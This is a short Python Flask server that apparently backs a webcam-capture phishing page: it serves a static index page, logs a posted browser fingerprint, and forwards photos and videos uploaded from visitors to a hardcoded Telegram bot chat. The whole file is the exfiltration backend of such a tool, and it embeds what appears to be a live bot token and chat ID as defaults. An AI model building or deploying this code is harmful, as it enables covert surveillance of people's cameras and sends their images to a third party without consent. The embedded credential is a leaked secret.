from flask import Flask, request, send_from_directory
import requests
import os

app = Flask(__name__, static_folder="static")

# Telegram bot info (use env vars on Render for security)
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8436537364:AAFi9kZYW0pg3Q85S9f2et0Mol8F-7CjX6I")
CHAT_ID = os.environ.get("CHAT_ID", "7802410095")

# Serve index.html at root
@app.route("/")
def home():
    return send_from_directory("static", "index.html")

# Fingerprint route
@app.route("/fingerprint", methods=["POST"])
def fingerprint():
    print("Fingerprint:", request.json)
    return "OK"

# Capture image route
@app.route("/capture", methods=["POST"])
def capture():
    img = request.files["image"]
    requests.post(
        f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
        data={"chat_id": CHAT_ID},
        files={"photo": img}
    )
    return "OK"

# Capture video route
@app.route("/capture_video", methods=["POST"])
def capture_video():
    video = request.files["video"]
    requests.post(
        f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo",
        data={"chat_id": CHAT_ID},
        files={"video": video}
    )
    return "OK"

# Serve other static files if needed
@app.route("/<path:path>")
def static_proxy(path):
    return send_from_directory("static", path)

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=True)
